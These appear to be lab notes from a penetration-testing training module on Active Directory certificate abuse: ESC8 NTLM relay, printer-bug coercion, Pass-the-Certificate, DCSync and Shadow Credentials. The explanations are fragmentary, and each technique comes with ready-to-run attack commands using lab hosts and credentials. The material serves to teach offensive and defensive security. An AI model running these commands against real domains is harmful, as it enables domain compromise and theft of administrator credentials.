**Overview:**
[PKINIT](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pkca/d0cf1763-3541-4008-a75f-a577fa5e8c5b), short for `Public Key Cryptography for Initial Authentication`, is an extension of the Kerberos protocol that enables the use of public key cryptography during the initial authentication exchange. It is typically used to support user logons via smart cards, which store the private keys. `Pass-the-Certificate` refers to the technique of using X.509 certificates to successfully obtain `Ticket Granting Tickets (TGTs)`. This method is used primarily alongside [attacks against Active Directory Certificate Services (AD CS)](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf), as well as in [Shadow Credential](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c) attacks.
`ESC8`—as described in the [Certified Pre-Owned](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) paper—is an NTLM relay attack targeting an ADCS HTTP endpoint. ADCS supports multiple enrollment methods, `including web enrollment`, which by default occurs over HTTP. A certificate authority configured to allow web enrollment typically hosts the following application at `/CertSrv`

[Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) refers to an Active Directory attack that abuses the [msDS-KeyCredentialLink](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c) attribute of a victim user. This attribute stores public keys that can be used for authentication via PKINIT. In BloodHound, the `AddKeyCredentialLink` edge indicates that one user has write permissions over another user's `msDS-KeyCredentialLink` attribute, allowing them to take control of that user.

## AD CS NTLM Relay Attack (ESC8)
```
impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```
Attackers can use Impacket’s [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) to listen for inbound connections and relay them to the web enrollment service

```
python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12
```
force machine accounts to authenticate against arbitrary hosts is by exploiting the [printer bug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py). This attack requires the targeted machine account to have the `Printer Spooler` service running. The command below forces `10.129.234.109 (DC01)` to attempt authentication against `10.10.16.12 (attacker host)`

## Pass the Certificate

```
 python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache
```
perform a `Pass-the-Certificate` attack to obtain a TGT as `DC01$`. One way to do this is by using [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py).

## Pass the ticket
```
export KRB5CCNAME=/tmp/dc.ccache
poi1111@htb[/htb]$ impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
```
Once we successfully obtain a TGT, we're back in Pass-the-Ticket (PtT) territory. As the domain controller's machine account, we can perform a DCSync attack to, for example, retrieve the NTLM hash of the domain administrator account.

## Shadow Credentials (msDS-KeyCredentialLink)
```
pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
```
use [pywhisker](https://github.com/ShutdownRepo/pywhisker) to perform this attack from a Linux system. The command below generates an `X.509 certificate` and writes the `public key` to the victim user's `msDS-KeyCredentialLink` attribute
see that a `PFX (PKCS12)` file was created (`eFUVVTPf.pfx`), and the password is shown.

```
python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
```
use the `PFX (PKCS12)` file   file with `gettgtpkinit.py` to acquire a TGT as the victim

```
export KRB5CCNAME=/tmp/jpinkman.ccache
poi1111@htb[/htb]$ klist
```
With the TGT obtained, we may once again `pass the ticket`

```
evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
```
if the victim user is a member of the `Remote Management Users` group, which permits them to connect to the machine via `WinRM`. As demonstrated in the previous section, we can use `Evil-WinRM` to connect using Kerberos (note: ensure that `krb5.conf` is properly configured
